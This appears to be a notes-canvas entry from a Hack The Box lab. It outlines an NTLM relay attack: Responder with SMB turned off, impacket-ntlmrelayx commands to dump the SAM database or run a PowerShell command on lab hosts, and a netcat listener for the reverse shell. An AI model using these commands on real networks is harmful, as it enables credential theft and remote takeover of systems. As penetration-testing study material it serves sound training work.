		{"id":"20021705e8986ee6","x":1125,"y":1940,"width":533,"height":1060,"type":"text","text":"1. switching of smb\n```shell-session\nnchiato@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='\n\nSMB = Off\n```\n2. Dump SAM DB or Rev Shell\n```shell-session\nnchiato@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146\n```\nor\n```shell-session\nnchiato@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e '\n```\n3. start litener\n```shell-session\nnchiato@htb[/htb]$ nc -lvnp 9001\n```\n4. Target connects to server and shell pops"}
